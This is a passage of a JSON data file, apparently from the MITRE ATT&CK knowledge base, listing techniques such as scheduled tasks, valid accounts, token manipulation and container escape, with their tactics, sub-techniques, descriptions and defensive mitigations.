              "content": "Ensure proper permissions are in place to help prevent adversary access to privileged accounts necessary to perform these actions"
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "Update Software",
        "description": [
          [
            {
              "type": "text",
              "content": "Patch the BIOS and EFI as necessary."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1053",
    "name": "Scheduled Task/Job",
    "tactics": [
      { "id": "TA0002", "name": "Execution" },
      { "id": "TA0003", "name": "Persistence" },
      { "id": "TA0004", "name": "Privilege Escalation" }
    ],
    "subs": [
      { "id": "T1053.002", "name": "At" },
      { "id": "T1053.003", "name": "Cron" },
      { "id": "T1053.005", "name": "Scheduled Task" },
      { "id": "T1053.006", "name": "Systemd Timers" },
      { "id": "T1053.007", "name": "Container Orchestration Job" }
    ],
    "version": "2.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to System Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges. "
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "Operating System Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Configure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM. The associated Registry key is located at "
            },
            {
              "type": "code",
              "content": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SubmitControl"
            },
            {
              "type": "text",
              "content": ". The setting can be configured through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > Security Options: Domain Controller: Allow server operators to schedule tasks, set to disabled. "
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Configure the Increase Scheduling Priority option to only allow the Administrators group the rights to schedule a priority process. This can be can be configured through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Increase scheduling priority. "
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1505",
    "name": "Server Software Component",
    "tactics": [{ "id": "TA0003", "name": "Persistence" }],
    "subs": [
      { "id": "T1505.001", "name": "SQL Stored Procedures" },
      { "id": "T1505.002", "name": "Transport Agent" },
      { "id": "T1505.003", "name": "Web Shell" },
      { "id": "T1505.004", "name": "IIS Components" },
      { "id": "T1505.005", "name": "Terminal Services DLL" }
    ],
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Regularly check component software on critical services that adversaries may target for persistence to verify the integrity of the systems and identify if unexpected changes have been made."
            }
          ]
        ]
      },
      {
        "id": "M1045",
        "name": "Code Signing",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure all application component binaries are signed by the correct application developers."
            }
          ]
        ]
      },
      {
        "id": "M1042",
        "name": "Disable or Remove Feature or Program",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider disabling software components from servers when possible to prevent abuse by adversaries."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Do not allow administrator accounts that have permissions to add component software on these services to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems."
            }
          ]
        ]
      },
      {
        "id": "M1024",
        "name": "Restrict Registry Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider using Group Policy to configure and block modifications to service and other critical server parameters in the Registry."
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Enforce the principle of least privilege by limiting privileges of user accounts so only authorized accounts can modify and/or add server software components."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1205",
    "name": "Traffic Signaling",
    "tactics": [
      { "id": "TA0005", "name": "Defense Evasion" },
      { "id": "TA0003", "name": "Persistence" },
      { "id": "TA0011", "name": "Command and Control" }
    ],
    "subs": [
      { "id": "T1205.001", "name": "Port Knocking" },
      { "id": "T1205.002", "name": "Socket Filters" }
    ],
    "version": "2.4",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. Port Knocking), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s)."
        }
      ],
      [
        {
          "type": "text",
          "content": "The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r , is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs."
        }
      ],
      [
        {
          "type": "text",
          "content": "On network devices, adversaries may use crafted packets to enable Network Device Authentication for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage Patch System Image due to the monolithic nature of the architecture."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "Disable or Remove Feature or Program",
        "description": [
          [
            {
              "type": "text",
              "content": "Disable Wake-on-LAN if it is not needed within an environment."
            }
          ]
        ]
      },
      {
        "id": "M1037",
        "name": "Filter Network Traffic",
        "description": [
          [
            {
              "type": "text",
              "content": "Mitigation of some variants of this technique could be achieved through the use of stateful firewalls, depending upon how it is implemented."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1078",
    "name": "Valid Accounts",
    "tactics": [
      { "id": "TA0005", "name": "Defense Evasion" },
      { "id": "TA0003", "name": "Persistence" },
      { "id": "TA0004", "name": "Privilege Escalation" },
      { "id": "TA0001", "name": "Initial Access" }
    ],
    "subs": [
      { "id": "T1078.001", "name": "Default Accounts" },
      { "id": "T1078.002", "name": "Domain Accounts" },
      { "id": "T1078.003", "name": "Local Accounts" },
      { "id": "T1078.004", "name": "Cloud Accounts" }
    ],
    "version": "2.6",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence."
        }
      ],
      [
        {
          "type": "text",
          "content": "In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account."
        }
      ],
      [
        {
          "type": "text",
          "content": "The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1036",
        "name": "Account Use Policies",
        "description": [
          [
            {
              "type": "text",
              "content": "Use conditional access policies to block logins from non-compliant devices or from outside defined organization IP ranges."
            }
          ]
        ]
      },
      {
        "id": "M1015",
        "name": "Active Directory Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Disable legacy authentication, which does not support MFA, and require the use of modern authentication protocols instead."
            }
          ]
        ]
      },
      {
        "id": "M1013",
        "name": "Application Developer Guidance",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure that applications do not store sensitive data or credentials insecurely. (e.g. plaintext credentials in code, published credentials in repositories, or credentials in public cloud storage)."
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "Password Policies",
        "description": [
          [
            {
              "type": "text",
              "content": "Applications and appliances that utilize default username and password should be changed immediately after the installation, and before deployment to a production environment. When possible, applications that use SSH keys should be updated periodically and properly secured."
            }
          ],
          [
            {
              "type": "text",
              "content": "Policies should minimize (if not eliminate) reuse of passwords between different user accounts, especially employees using the same credentials for personal accounts that may not be defended by enterprise security resources."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.   These audits should also include if default accounts have been enabled, or if new local accounts are created that have not be authorized. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. "
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Regularly audit user accounts for activity and deactivate or remove any that are no longer needed."
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "User Training",
        "description": [
          [
            {
              "type": "text",
              "content": "Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA). Train users to only accept valid push notifications and to report suspicious push notifications."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1548",
    "name": "Abuse Elevation Control Mechanism",
    "tactics": [
      { "id": "TA0004", "name": "Privilege Escalation" },
      { "id": "TA0005", "name": "Defense Evasion" }
    ],
    "subs": [
      { "id": "T1548.001", "name": "Setuid and Setgid" },
      { "id": "T1548.002", "name": "Bypass User Account Control" },
      { "id": "T1548.003", "name": "Sudo and Sudo Caching" },
      { "id": "T1548.004", "name": "Elevated Execution with Prompt" },
      { "id": "T1548.005", "name": "Temporary Elevated Cloud Access" }
    ],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Check for common UAC bypass weaknesses on Windows systems to be aware of the risk posture and address issues where appropriate."
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "Execution Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "System settings can prevent applications from running that haven't been downloaded from legitimate repositories which may help mitigate some of these issues. Not allowing unsigned applications from being run may also mitigate some risk."
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "Operating System Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Applications with known vulnerabilities or known shell escapes should not have the setuid or setgid bits set to reduce potential damage if an application is compromised. Additionally, the number of programs with setuid or setgid bits set should be minimized across a system. Ensuring that the sudo tty_tickets setting is enabled will prevent this leakage across tty sessions."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Remove users from the local administrator group on systems."
            }
          ],
          [
            {
              "type": "text",
              "content": "By requiring a password, even if an adversary can get terminal access, they must know the password to run anything in the sudoers file. Setting the timestamp_timeout to 0 will require the user to input their password every time sudo is executed."
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "Restrict File and Directory Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "The sudoers file should be strictly edited such that passwords are always required and that users can't spawn risky processes as users with higher privilege."
            }
          ]
        ]
      },
      {
        "id": "M1052",
        "name": "User Account Control",
        "description": [
          [
            {
              "type": "text",
              "content": "Although UAC bypass techniques exist, it is still prudent to use the highest enforcement level for UAC when possible and mitigate bypass opportunities that exist with techniques such as DLL Search Order Hijacking."
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit the privileges of cloud accounts to assume, create, or impersonate additional roles, policies, and permissions to only those required. Where just-in-time access is enabled, consider requiring manual approval for temporary elevation of privileges."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1134",
    "name": "Access Token Manipulation",
    "tactics": [
      { "id": "TA0005", "name": "Defense Evasion" },
      { "id": "TA0004", "name": "Privilege Escalation" }
    ],
    "subs": [
      { "id": "T1134.001", "name": "Token Impersonation/Theft" },
      { "id": "T1134.002", "name": "Create Process with Token" },
      { "id": "T1134.003", "name": "Make and Impersonate Token" },
      { "id": "T1134.004", "name": "Parent PID Spoofing" },
      { "id": "T1134.005", "name": "SID-History Injection" }
    ],
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token."
        }
      ],
      [
        {
          "type": "text",
          "content": "An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. Token Impersonation/Theft) or used to spawn a new process (i.e. Create Process with Token). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system."
        }
      ],
      [
        { "type": "text", "content": "Any standard user can use the " },
        { "type": "code", "content": "runas" },
        {
          "type": "text",
          "content": " command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit permissions so that users and user groups cannot create tokens. This setting should be defined for the local system account only. GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Create a token object.  Also define who can create a process level token to only the local and network service through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Replace a process level token."
            }
          ],
          [
            {
              "type": "text",
              "content": "Administrators should log in as a standard user but run their tools with administrator privileges using the built-in access token manipulation command "
            },
            { "type": "code", "content": "runas" },
            { "type": "text", "content": "." }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "An adversary must already have administrator level access on the local system to make full use of this technique; be sure to restrict users and accounts to the least privileges they require.  "
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1098",
    "name": "Account Manipulation",
    "tactics": [
      { "id": "TA0003", "name": "Persistence" },
      { "id": "TA0004", "name": "Privilege Escalation" }
    ],
    "subs": [
      { "id": "T1098.001", "name": "Additional Cloud Credentials" },
      { "id": "T1098.002", "name": "Additional Email Delegate Permissions" },
      { "id": "T1098.003", "name": "Additional Cloud Roles" },
      { "id": "T1098.004", "name": "SSH Authorized Keys" },
      { "id": "T1098.005", "name": "Device Registration" },
      { "id": "T1098.006", "name": "Additional Container Cluster Roles" }
    ],
    "version": "2.6",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. "
        }
      ],
      [
        {
          "type": "text",
          "content": "In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged Valid Accounts."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1032",
        "name": "Multi-factor Authentication",
        "description": [
          [
            {
              "type": "text",
              "content": "Use multi-factor authentication for user and privileged accounts."
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "Network Segmentation",
        "description": [
          [
            {
              "type": "text",
              "content": "Configure access controls and firewalls to limit access to critical systems and domain controllers. Most cloud environments support separate virtual private cloud (VPC) instances that enable further segmentation of cloud systems."
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "Operating System Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Protect domain controllers by ensuring proper security configuration for critical servers to limit access by potentially unnecessary protocols and services, such as SMB file sharing."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems."
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure that low-privileged user accounts do not have permissions to modify accounts or account-related policies."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1547",
    "name": "Boot or Logon Autostart Execution",
    "tactics": [
      { "id": "TA0003", "name": "Persistence" },
      { "id": "TA0004", "name": "Privilege Escalation" }
    ],
    "subs": [
      { "id": "T1547.001", "name": "Registry Run Keys / Startup Folder" },
      { "id": "T1547.002", "name": "Authentication Package" },
      { "id": "T1547.003", "name": "Time Providers" },
      { "id": "T1547.004", "name": "Winlogon Helper DLL" },
      { "id": "T1547.005", "name": "Security Support Provider" },
      { "id": "T1547.006", "name": "Kernel Modules and Extensions" },
      { "id": "T1547.007", "name": "Re-opened Applications" },
      { "id": "T1547.008", "name": "LSASS Driver" },
      { "id": "T1547.009", "name": "Shortcut Modification" },
      { "id": "T1547.010", "name": "Port Monitors" },
      { "id": "T1547.012", "name": "Print Processors" },
      { "id": "T1547.013", "name": "XDG Autostart Entries" },
      { "id": "T1547.014", "name": "Active Setup" },
      { "id": "T1547.015", "name": "Login Items" }
    ],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon. These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel."
        }
      ],
      [
        {
          "type": "text",
          "content": "Since some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges."
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1037",
    "name": "Boot or Logon Initialization Scripts",
    "tactics": [
      { "id": "TA0003", "name": "Persistence" },
      { "id": "TA0004", "name": "Privilege Escalation" }
    ],
    "subs": [
      { "id": "T1037.001", "name": "Logon Script (Windows)" },
      { "id": "T1037.002", "name": "Login Hook" },
      { "id": "T1037.003", "name": "Network Logon Script" },
      { "id": "T1037.004", "name": "RC Scripts" },
      { "id": "T1037.005", "name": "Startup Items" }
    ],
    "version": "2.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  "
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. "
        }
      ],
      [
        {
          "type": "text",
          "content": "An adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1022",
        "name": "Restrict File and Directory Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "Restrict write access to logon scripts to specific administrators."
            }
          ]
        ]
      },
      {
        "id": "M1024",
        "name": "Restrict Registry Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure proper permissions are set for Registry hives to prevent users from modifying keys for logon scripts that may lead to persistence."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1543",
    "name": "Create or Modify System Process",
    "tactics": [
      { "id": "TA0003", "name": "Persistence" },
      { "id": "TA0004", "name": "Privilege Escalation" }
    ],
    "subs": [
      { "id": "T1543.001", "name": "Launch Agent" },
      { "id": "T1543.002", "name": "Systemd Service" },
      { "id": "T1543.003", "name": "Windows Service" },
      { "id": "T1543.004", "name": "Launch Daemon" }
    ],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services. On macOS, launchd processes known as Launch Daemon and Launch Agent are run to finish system initialization and load user specific parameters. "
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  "
        }
      ],
      [
        {
          "type": "text",
          "content": "Services, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges. "
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Use auditing tools capable of detecting privilege and service abuse opportunities on systems within an enterprise and correct them."
            }
          ]
        ]
      },
      {
        "id": "M1040",
        "name": "Behavior Prevention on Endpoint",
        "description": [
          [
            {
              "type": "text",
              "content": "On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent an application from writing a signed vulnerable driver to the system. On Windows 10 and 11, enable Microsoft Vulnerable Driver Blocklist to assist in hardening against third party-developed drivers. "
            }
          ]
        ]
      },
      {
        "id": "M1045",
        "name": "Code Signing",
        "description": [
          [
            {
              "type": "text",
              "content": "Enforce registration and execution of only legitimately signed service drivers where possible."
            }
          ]
        ]
      },
      {
        "id": "M1033",
        "name": "Limit Software Installation",
        "description": [
          [
            {
              "type": "text",
              "content": "Restrict software installation to trusted repositories only and be cautious of orphaned software packages."
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "Operating System Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure that Driver Signature Enforcement is enabled to restrict unsigned drivers from being installed. "
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "Restrict File and Directory Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "Restrict read/write access to system-level process files to only select privileged users who have a legitimate need to manage system services."
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit privileges of user accounts and groups so that only authorized administrators can interact with system-level process changes and service configurations."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1484",
    "name": "Domain Policy Modification",
    "tactics": [
      { "id": "TA0005", "name": "Defense Evasion" },
      { "id": "TA0004", "name": "Privilege Escalation" }
    ],
    "subs": [
      { "id": "T1484.001", "name": "Group Policy Modification" },
      { "id": "T1484.002", "name": "Domain Trust Modification" }
    ],
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may modify the configuration settings of a domain to evade defenses and/or escalate privileges in domain environments. Domains provide a centralized means of managing how computer resources (ex: computers, user accounts) can act, and interact with each other, on a network. The policy of the domain also includes configuration settings that may apply between domains in a multi-domain/forest environment. Modifications to domain settings may include altering domain Group Policy Objects (GPOs) or changing trust settings for domains, including federation trusts."
        }
      ],
      [
        {
          "type": "text",
          "content": "With sufficient permissions, adversaries can modify domain policy settings. Since domain configuration settings control many of the interactions within the Active Directory (AD) environment, there are a great number of potential attacks that can stem from this abuse. Examples of such abuse include modifying GPOs to push a malicious Scheduled Task to computers throughout the domain environment or modifying domain trusts to include an adversary controlled domain where they can control access tokens that will subsequently be accepted by victim domain resources. Adversaries can also change configuration settings within the AD environment to implement a Rogue Domain Controller."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may temporarily modify domain policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Identify and correct GPO permissions abuse opportunities (ex: GPO modification privileges) using auditing tools such as BloodHound (version 1.5.1 and later)."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Use least privilege and protect administrative access to the Domain Controller and Active Directory Federation Services (AD FS) server. Do not create service accounts with administrative privileges."
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider implementing WMI and security filtering to further tailor which users and computers a GPO will apply to."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1611",
    "name": "Escape to Host",
    "tactics": [{ "id": "TA0004", "name": "Privilege Escalation" }],
    "subs": [],
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may break out of a container to gain access to the underlying host. This can allow an adversary access to other containerized resources from the host level or to the host itself. In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment."
        }
      ],
      [
        {
          "type": "text",
          "content": "There are multiple ways an adversary may escape to a host environment. Examples include creating a container configured to mount the host’s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as "
        },
        { "type": "code", "content": "unshare" },
        { "type": "text", "content": " and " },
        { "type": "code", "content": "keyctl" },
        {
          "type": "text",
          "content": " to escalate privileges and steal secrets."
        }
      ],
      [
        {
          "type": "text",
          "content": "Additionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as "
        },
        { "type": "code", "content": "docker.sock" },
        {
          "type": "text",
          "content": ", to break out of the container via a Container Administration Command. Adversaries may also escape via Exploitation for Privilege Escalation, such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine."
        }
      ],
      [
        {
          "type": "text",
          "content": "Gaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, or setting up a command and control channel on the host."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1048",
        "name": "Application Isolation and Sandboxing",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider utilizing seccomp, seccomp-bpf, or a similar solution that restricts certain system calls such as mount. In Kubernetes environments, consider defining Pod Security Standards that limit container access to host process namespaces, the host network, and the host file system."
            }
          ]
        ]
      },
      {
        "id": "M1042",
        "name": "Disable or Remove Feature or Program",
        "description": [
          [
            {
              "type": "text",
              "content": "Remove unnecessary tools and software from containers."
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "Execution Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Use read-only containers, read-only file systems, and minimal images when possible to prevent the running of commands. Where possible, also consider using application control and software restriction tools (such as those provided by SELinux) to restrict access to files, processes, and system calls in containers."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure containers are not running as root by default and do not use unnecessary privileges or mounted components. In Kubernetes environments, consider defining Pod Security Standards that prevent pods from running privileged containers."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1546",
    "name": "Event Triggered Execution",
    "tactics": [
      { "id": "TA0004", "name": "Privilege Escalation" },
      { "id": "TA0003", "name": "Persistence" }
    ],
    "subs": [
      { "id": "T1546.001", "name": "Change Default File Association" },
      { "id": "T1546.002", "name": "Screensaver" },
      {
        "id": "T1546.003",
        "name": "Windows Management Instrumentation Event Subscription"
      },
      { "id": "T1546.004", "name": "Unix Shell Configuration Modification" },
      { "id": "T1546.005", "name": "Trap" },
      { "id": "T1546.006", "name": "LC_LOAD_DYLIB Addition" },
      { "id": "T1546.007", "name": "Netsh Helper DLL" },
      { "id": "T1546.008", "name": "Accessibility Features" },
      { "id": "T1546.009", "name": "AppCert DLLs" },
      { "id": "T1546.010", "name": "AppInit DLLs" },
      { "id": "T1546.011", "name": "Application Shimming" },
      { "id": "T1546.012", "name": "Image File Execution Options Injection" },
      { "id": "T1546.013", "name": "PowerShell Profile" },
      { "id": "T1546.014", "name": "Emond" },
      { "id": "T1546.015", "name": "Component Object Model Hijacking" },
      { "id": "T1546.016", "name": "Installer Packages" }
    ],
    "version": "1.2",
    "description": [
      [
        {
